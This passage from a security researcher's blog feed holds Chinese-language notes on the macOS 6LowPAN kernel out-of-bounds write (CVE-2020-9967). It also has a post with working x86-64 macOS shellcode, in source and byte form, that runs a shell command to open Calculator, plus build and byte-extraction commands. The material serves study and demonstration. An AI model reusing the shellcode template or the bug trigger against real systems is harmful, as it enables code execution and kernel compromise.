class="comment">/*</span></span><br><span class="line"><span class="comment"> * Function: sixlowpan_attach_protocol</span></span><br><span class="line"><span class="comment"> * Purpose:</span></span><br><span class="line"><span class="comment"> *   Attach a DLIL protocol to the interface</span></span><br><span class="line"><span class="comment"> *     The ethernet demux actually special cases 802.15.4.</span></span><br><span class="line"><span class="comment"> *     The demux here isn&#x27;t used. The demux will return PF_802154 for the</span></span><br><span class="line"><span class="comment"> *     appropriate packets and our sixlowpan_input function will be called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sixlowpan_attach_protocol</span><span class="params">(struct ifnet *ifp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>     error;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifnet_attach_proto_param</span> <span class="title">reg</span>;</span></span><br><span class="line"></span><br><span class="line">    bzero(&amp;reg, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">    reg.input            = sixlowpan_input;</span><br><span class="line">    reg.detached         = sixlowpan_detached;</span><br><span class="line">    error = ifnet_attach_protocol(ifp, PF_802154, &amp;reg);</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s(%s%d) ifnet_attach_protocol failed, %d\n&quot;</span>,</span><br><span class="line">            __func__, ifnet_name(ifp), ifnet_unit(ifp), error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h4><p>调用sixlowpan_input函数来解封装802.15.4数据帧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 6lowpan input routine.</span></span><br><span class="line"><span class="comment"> * Decapsulate the 802.15.4 Data Frame</span></span><br><span class="line"><span class="comment"> * Header decompression on the payload</span></span><br><span class="line"><span class="comment"> * Pass the mbuf to the IPV6 protocol stack using proto_input()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sixlowpan_input</span><span class="params">(<span class="keyword">ifnet_t</span> p, __unused <span class="keyword">protocol_family_t</span> protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">mbuf_t</span> m, __unused <span class="keyword">char</span> *frame_header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">frame802154_t</span>      ieee02154hdr;</span><br><span class="line">    <span class="keyword">u_int8_t</span>           *payload = <span class="literal">NULL</span>;</span><br><span class="line">    if6lpan_ref        ifl = <span class="literal">NULL</span>;</span><br><span class="line">    bpf_packet_func    bpf_func;</span><br><span class="line">    <span class="keyword">mbuf_t</span> mc, m_temp;</span><br><span class="line">    <span class="keyword">int</span> off, err = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int16_t</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an mbuf cluster for the 802.15.4 frame and uncompressed payload */</span></span><br><span class="line">    mc = m_getcl(M_WAITOK, MT_DATA, M_PKTHDR);</span><br><span class="line">    <span class="keyword">if</span> (mc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;len, mtod(m, <span class="keyword">u_int8_t</span> *), <span class="keyword">sizeof</span>(<span class="keyword">u_int16_t</span>));</span><br><span class="line">    len = ntohs(len);**                     <span class="comment">// This is the size read from the frame on the wire. </span></span><br><span class="line">    m_adj(m, <span class="keyword">sizeof</span>(<span class="keyword">u_int16_t</span>));</span><br><span class="line">    <span class="comment">/* Copy the compressed 802.15.4 payload from source mbuf to allocated cluster mbuf */</span></span><br><span class="line">    <span class="keyword">for</span> (m_temp = m, off = <span class="number">0</span>; m_temp != <span class="literal">NULL</span>; m_temp = m_temp-&gt;m_next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m_temp-&gt;m_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            m_copyback(mc, off, m_temp-&gt;m_len, mtod(m_temp, <span class="keyword">void</span> *));</span><br><span class="line">            off += m_temp-&gt;m_len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = p_6lowpan_ifnet;</span><br><span class="line">    mc-&gt;m_pkthdr.rcvif = p;</span><br><span class="line"></span><br><span class="line">    sixlowpan_lock();</span><br><span class="line">    ifl = ifnet_get_if6lpan_retained(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ifl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        sixlowpan_unlock();</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (if6lpan_flags_ready(ifl) == <span class="number">0</span>) &#123;</span><br><span class="line">        if6lpan_release(ifl);</span><br><span class="line">        sixlowpan_unlock();</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bpf_func = ifl-&gt;if6lpan_bpf_input;</span><br><span class="line">    sixlowpan_unlock();</span><br><span class="line">    if6lpan_release(ifl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bpf_func) &#123;</span><br><span class="line">        bpf_func(p, mc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the 802.15.4 frame header */</span></span><br><span class="line">    bzero(&amp;ieee02154hdr, <span class="keyword">sizeof</span>(ieee02154hdr));</span><br><span class="line">    frame802154_parse(mtod(mc, <span class="keyword">uint8_t</span> *), len, &amp;ieee02154hdr, &amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX Add check for your link layer address being dest */</span></span><br><span class="line">    sixxlowpan_input(&amp;ieee02154hdr, payload);</span><br></pre></td></tr></table></figure><ol><li><code>m_getcl</code> 分配mc(mbuf cluster)来存放要处理的 802.15.4 f帧和未解压的payload</li><li>拷贝未解压的802.15.4 payload 到新分配的mc中</li></ol><p>len 是从参数 mbuf m 中读取得到的，这是一个可控的值，在后面解析逻辑: <strong><code>frame802154_parse</code> ，这个长度是直接使用的。</strong></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2015.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2015.png"></p><p>因为我们可以将len控制在0-0xffff之间，所以我们可以使pf-&gt;payload_len为负值(to-header len)，小于预期的大小，或者大于mc中输入数据本身的大小。</p><p>随后的调用是 <strong><code>sixxlowpan_input(&amp;ieee02154hdr, payload);</code></strong> </p><p>这个函数直接使用了 之前解析出来的pf 和 payload。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">errno_t</span></span></span><br><span class="line"><span class="function"><span class="title">sixxlowpan_input</span><span class="params">(struct frame802154 *ieee02154hdr, <span class="keyword">u_int8_t</span> *payload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">errno_t</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    error = sixxlowpan_uncompress(ieee02154hdr, payload);</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * TO DO: fragmentation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后走到 <code>sixxlowpan_uncompress</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">errno_t</span></span></span><br><span class="line"><span class="function"><span class="title">sixxlowpan_uncompress</span><span class="params">(struct frame802154 ***ieee02154hdr**, <span class="keyword">u_int8_t</span> *payload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> hdroffset;</span><br><span class="line">    <span class="keyword">size_t</span> hdrlen;</span><br><span class="line">    <span class="keyword">u_int8_t</span> hdrbuf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">errno_t</span> error;</span><br><span class="line"></span><br><span class="line">    bzero(hdrbuf, <span class="keyword">sizeof</span>(hdrbuf));</span><br><span class="line">    hdrlen = <span class="keyword">sizeof</span>(hdrbuf);</span><br><span class="line"></span><br><span class="line">    error = uncompress_hdr_hc1(ieee02154hdr, (<span class="keyword">u_int8_t</span> *)payload,</span><br><span class="line">        <span class="number">0</span>, &amp;hdroffset, &amp;hdrlen, hdrbuf); <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hdroffset &lt; <span class="number">0</span>) &#123; <span class="comment">// 1</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * hdroffset negative means that we have to remove</span></span><br><span class="line"><span class="comment">         * hdrlen of extra stuff</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        memmove(&amp;payload[<span class="number">0</span>],</span><br><span class="line">            &amp;payload[hdrlen],</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdrlen);</span><br><span class="line">        ieee02154hdr-&gt;payload_len -= hdrlen;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * hdroffset is the size of the compressed header</span></span><br><span class="line"><span class="comment">         * -- i.e. when the untouched data starts</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * hdrlen is the size of the decompressed header</span></span><br><span class="line"><span class="comment">         * that takes the place of compressed header of size hdroffset</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        memmove(payload + hdrlen,</span><br><span class="line">            payload + hdroffset,</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdroffset); <span class="comment">// 2， oob write here, `ieee02154hdr-&gt; payload_len-3 = -2`</span></span><br><span class="line">        <span class="built_in">memcpy</span>(payload, hdrbuf, hdrlen);</span><br><span class="line">        ieee02154hdr-&gt;payload_len += hdrlen - hdroffset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，如果我们将接收到的帧的len设置为0x4，则最终将计算出以下值(<code>frame802154_parse</code>)：</p><p><code>c</code> header length = 3 </p><p><code>frame-&gt;payload_len</code>= 1</p><p>同时，在<code>uncompress_hdr_hc1</code>函数中（at 0)，控制流程走到 <code>SICSLOWPAN_HC1_NH_UDP</code> 分支：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*hdroffset = SICSLOWPAN_HC1_HDR_LEN;  --&gt; *hdroffset = 3</span><br><span class="line">*hdrlen = UIP_IPH_LEN;                --&gt; *hdrlen = 40</span><br><span class="line">sizeof(struct ip6_hdr) = 40</span><br></pre></td></tr></table></figure><p>再回到上层函数<code>sixxlowpan_uncompress</code> (at 1)，hdroffset 为3，走下面的分支，能够走到 memmove调用(at 2)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memmove(payload + hdrlen,</span><br><span class="line">            payload + hdroffset,</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdroffset); </span><br></pre></td></tr></table></figure><p>where : payload + 40</p><p>what :  source payload buffer, 可控</p><p>length : ieee02154hdr-&gt;payload_len - hdroffset 即 payload_len - hdroffset = 1 - 3 = -2</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">Building XNU for macOS Big Sur 11.0.1 (Intel)</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/aliyuncs.com/img/codeql_xnu/codeql-xnu_xnu.md">D4rkD0g/boringforever</a></p><p><a href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407">Kernel crash caused by out-of-bounds write in Apple’s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab</a></p><p><a href="https://alexplaskett.github.io/CVE-2020-9967/">CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Basic&quot;&gt;&lt;a href=&quot;#Basic&quot; class=&quot;headerlink&quot; title=&quot;Basic&quot;&gt;&lt;/a&gt;Basic&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;本文属于学习过程中的笔记，基本上是把现有的相关资料整合到一起，阅读已有博客/文章并复现，加入一些自己的想法后记录下来的产物。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;build XNU 过程来自某大佬的博客，&lt;code&gt;build xnu with codeql&lt;/code&gt;过程来自&lt;code&gt;github&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://o0xmuhe.me/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="XNU" scheme="http://o0xmuhe.me/tags/XNU/"/>
    
    <category term="CodeQL" scheme="http://o0xmuhe.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>SHELLCODE on macOS</title>
    <link href="http://o0xmuhe.me/2020/11/28/shell-code-on-macos/"/>
    <id>http://o0xmuhe.me/2020/11/28/shell-code-on-macos/</id>
    <published>2020-11-27T16:25:17.000Z</published>
    <updated>2020-11-27T17:08:29.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shellcode-on-macOS"><a href="#shellcode-on-macOS" class="headerlink" title="shellcode on macOS"></a>shellcode on macOS</h2><p>最近因为一些工作上的需求需要搞下macOS上的shellcdoe，谷歌了很多资料/代码后发现还是有不少坑的，或者就是代码比较老，定制化程度比较高，不太符合我的需求，其实我需求也简单 pop calc或者reverse shell，就是个演示效果 🤣。</p><a id="more"></a><h2 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h2><p>我这里环境是 macOS big sur(对，没错，小白鼠🐁)</p><p>工具链基本都是brew直接装或者自带的。</p><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>其实在macOS上写shellcode和Linux差不多，都是要走系统调用，大概就是布置参数，写好调用号，然后一个syscall进去即可。</p><p>我这里为了省事儿，做的是执行<code>system(&#39;xxxxxx&#39;)</code>的shellcode，这样对于我演示来说，不管是弹计算器还是反弹shell都比较简单，如果是实战啥的，建议参考很早之前hacking team泄漏那种玩法，不过核心原理都是那样，不过人家玩的比较高级(毕竟军火嘛)。</p><p>exec_calc.asm: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">BITS 64</span><br><span class="line"></span><br><span class="line">global start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    mov     rax,0x2</span><br><span class="line">    ror     rax, 0x28</span><br><span class="line">    or      rax, 59</span><br><span class="line">    mov rcx, rax</span><br><span class="line"></span><br><span class="line">    xor     rdx, rdx</span><br><span class="line">    mov     rbx, 0x68732f2f6e69622f</span><br><span class="line">    push    rdx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rdi</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    mov     rbx, 0x632d</span><br><span class="line">    push    rdx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rbx</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    </span><br><span class="line">    ; 参数开始</span><br><span class="line">    mov rcx, 0x7070612e726f7461</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x6c75636c61432f73</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x6e6f69746163696c</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x7070412f6d657473</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x79532f206e65706f</span><br><span class="line">    push rcx</span><br><span class="line">    ; 参数结束</span><br><span class="line">    </span><br><span class="line">    push rsp</span><br><span class="line">    pop rcx</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rdi</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rsi</span><br><span class="line"></span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>其实核心的就是执行的命令，即字符串怎么构造进去，这里是都压到栈里然后传递个指针，常规操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f macho64 -o exec_calc.o exec_calc.asm</span><br><span class="line">$ ld -macosx_version_min 10.7.0 -o exec_calc exec_calc.o</span><br><span class="line">ld: warning: building <span class="keyword">for</span> macOS 10.7.0 is deprecated</span><br></pre></td></tr></table></figure><p>然后从objdump的结果中提取字节码即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d ./exec_calc.o</span><br><span class="line"></span><br><span class="line">./exec_calc.o:file format Mach-O 64-bit x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section __TEXT,__text:</span><br><span class="line"></span><br><span class="line">0000000000000000 start:</span><br><span class="line">       0: 48 31 c0                     xorq%rax, %rax</span><br><span class="line">       3: b8 02 00 00 00               movl<span class="variable">$2</span>, %eax</span><br><span class="line">       8: 48 c1 c8 28                  rorq<span class="variable">$40</span>, %rax</span><br><span class="line">       c: 48 83 c8 3b                  orq<span class="variable">$59</span>, %rax</span><br><span class="line">      10: 48 89 c1                     movq%rax, %rcx</span><br><span class="line">      13: 48 31 d2                     xorq%rdx, %rdx</span><br><span class="line">      16: 48 bb 2f 62 69 6e 2f 2f 73 68movabsq<span class="variable">$7526411283028599343</span>, %rbx</span><br><span class="line">      20: 52                           pushq%rdx</span><br><span class="line">      21: 53                           pushq%rbx</span><br><span class="line">      22: 54                           pushq%rsp</span><br><span class="line">      23: 5f                           popq%rdi</span><br><span class="line">      24: 52                           pushq%rdx</span><br><span class="line">      25: bb 2d 63 00 00               movl<span class="variable">$25389</span>, %ebx</span><br><span class="line">      2a: 52                           pushq%rdx</span><br><span class="line">      2b: 53                           pushq%rbx</span><br><span class="line">      2c: 54                           pushq%rsp</span><br><span class="line">      2d: 5b                           popq%rbx</span><br><span class="line">      2e: 52                           pushq%rdx</span><br><span class="line">      2f: 48 b9 61 74 6f 72 2e 61 70 70movabsq<span class="variable">$8102082581755819105</span>, %rcx</span><br><span class="line">      39: 51                           pushq%rcx</span><br><span class="line">      3a: 48 b9 73 2f 43 61 6c 63 75 6cmovabsq<span class="variable">$7815262045510774643</span>, %rcx</span><br><span class="line">      44: 51                           pushq%rcx</span><br><span class="line">      45: 48 b9 6c 69 63 61 74 69 6f 6emovabsq<span class="variable">$7957695015157983596</span>, %rcx</span><br><span class="line">      4f: 51                           pushq%rcx</span><br><span class="line">      50: 48 b9 73 74 65 6d 2f 41 70 70movabsq<span class="variable">$8102047401594156147</span>, %rcx</span><br><span class="line">      5a: 51                           pushq%rcx</span><br><span class="line">      5b: 48 b9 6f 70 65 6e 20 2f 53 79movabsq<span class="variable">$8742383117993865327</span>, %rcx</span><br><span class="line">      65: 51                           pushq%rcx</span><br><span class="line">      66: 54                           pushq%rsp</span><br><span class="line">      67: 59                           popq%rcx</span><br><span class="line">      68: 52                           pushq%rdx</span><br><span class="line">      69: 51                           pushq%rcx</span><br><span class="line">      6a: 53                           pushq%rbx</span><br><span class="line">      6b: 57                           pushq%rdi</span><br><span class="line">      6c: 54                           pushq%rsp</span><br><span class="line">      6d: 5e                           popq%rsi</span><br><span class="line">      6e: 0f 05                        syscall</span><br></pre></td></tr></table></figure><p>这一步见仁见智了，有大佬用bash一行搞定，而我比较菜，之前是写了个py脚本提取然后格式化输出的。</p><p>之前看到过一个Linux版本的一键提取，不过感觉太复杂了…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./execve-stack|grep <span class="string">'[0-9a-f]:'</span>|grep -v <span class="string">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">' '</span>|tr -s <span class="string">' '</span>|tr <span class="string">'\t'</span> <span class="string">' '</span>|sed <span class="string">'s/ $//g'</span>|sed <span class="string">'s/ /\\x/g'</span>|paste -d <span class="string">''</span> -s |sed <span class="string">'s/^/"/'</span>|sed <span class="string">'s/$/"/g'</span></span><br></pre></td></tr></table></figure><p>有兴趣的朋友可以搞个macOS版本🤣</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://modexp.wordpress.com/2017/01/21/shellcode-osx/">shellcode-osx</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;shellcode-on-macOS&quot;&gt;&lt;a href=&quot;#shellcode-on-macOS&quot; class=&quot;headerlink&quot; title=&quot;shellcode on macOS&quot;&gt;&lt;/a&gt;shellcode on macOS&lt;/h2&gt;&lt;p&gt;最近因为一些工作上的需求需要搞下macOS上的shellcdoe，谷歌了很多资料/代码后发现还是有不少坑的，或者就是代码比较老，定制化程度比较高，不太符合我的需求，其实我需求也简单 pop calc或者reverse shell，就是个演示效果 🤣。&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/categories/exploit/"/>
    
    
    <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="shellcode" scheme="http://o0xmuhe.me/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>NAS折腾记录</title>
    <link href="http://o0xmuhe.me/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/"/>
    <id>http://o0xmuhe.me/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/</id>
    <published>2020-10-07T12:13:21.000Z</published>
    <updated>2021-06-09T14:35:02.457Z</updated>
    
